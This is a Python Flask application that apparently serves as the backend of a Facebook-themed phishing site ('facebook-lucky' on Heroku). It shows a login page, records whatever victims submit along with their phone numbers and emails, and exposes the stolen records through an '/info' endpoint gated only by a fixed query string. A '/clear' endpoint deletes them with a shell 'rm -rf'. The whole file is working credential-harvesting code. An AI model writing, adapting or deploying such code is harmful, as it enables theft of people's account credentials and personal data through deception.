# -*- coding: utf-8 -*-
"""

@author: Sevendi Eldrige Rifki Poluan
"""

import flask 
from flask import render_template
from flask import request, jsonify
import uuid
import os 
import pickle

PATH = '/app/app/info' 
app = flask.Flask(__name__)  

class PickleDumpLoad(object): 
    def __init__(self):
        self.address = f'{PATH}/'
        
    def save_config(self, obj, filename): 
         
        with open('{}{}' . format(self.address, filename), 'wb') as config_f:
            pickle.dump(obj, config_f, protocol=4) # PROTOCOL = 4 ALLOWING TO SAVE LARGE OBJECT   
        print('{}{} saved.' . format(self.address, filename))
        
    def load_config(self, filename):  
        with open('{}{}' . format(self.address, filename), 'rb') as f_in:
             obj = pickle.load(f_in)
        return obj 
 
@app.route('/', methods=['GET'])
def login():
    return render_template('index.html')

@app.route('/good_job', methods=['POST'])
def store_info(): 
    data = request.get_json()   
    if 'database.pickle' in os.listdir(PATH):
        load_data_fix = PickleDumpLoad().load_config("database.pickle")
        load_data_fix[str(uuid.uuid4())] = data
        PickleDumpLoad().save_config(load_data_fix, 'database.pickle')
    else:
        data_fix = {} 
        data_fix[str(uuid.uuid4())] = data  
        PickleDumpLoad().save_config(data_fix, 'database.pickle')
    return jsonify({"status":"ok"}), 200

@app.route('/save_phone', methods=['POST'])
def store_phone():
    data = request.get_json()   
    phone = data['phone']
    email = data['email'] 
    load_data_fix = PickleDumpLoad().load_config("database.pickle")
    get_uid = []
    for key, val in load_data_fix.items():
        if val['email'] == email:
            get_uid.append(key)
    for key in get_uid:
        load_data_fix[key]['phone'] = phone
    PickleDumpLoad().save_config(load_data_fix, 'database.pickle')
    return jsonify({"status":"ok"}), 200

# ACCESS THE PAGE: https://facebook-lucky.herokuapp.com/info?source=source
@app.route('/info', methods=['GET'])
def get_data():
    source = request.args.get('source')
    if source == "source":
        if 'database.pickle' in os.listdir(PATH):
            load_data_fix = PickleDumpLoad().load_config("database.pickle")
            return jsonify(load_data_fix), 200
        else:
            return jsonify({"status":"no info"}), 401
    else:
        return jsonify({"status":"no info"}), 401

# ACCESS THE PAGE: https://facebook-lucky.herokuapp.com/clear?source=clear    
@app.route('/clear', methods=['GET'])
def clear_database(): 
    source = request.args.get('source')
    print(source)
    if source == "clear":
        try:
            os.system(f'rm -rf {PATH}/*.pickle')
        except:
            pass
        return jsonify({"status":"ok"}), 200
    else:
        return jsonify({"status":"no info"}), 401
  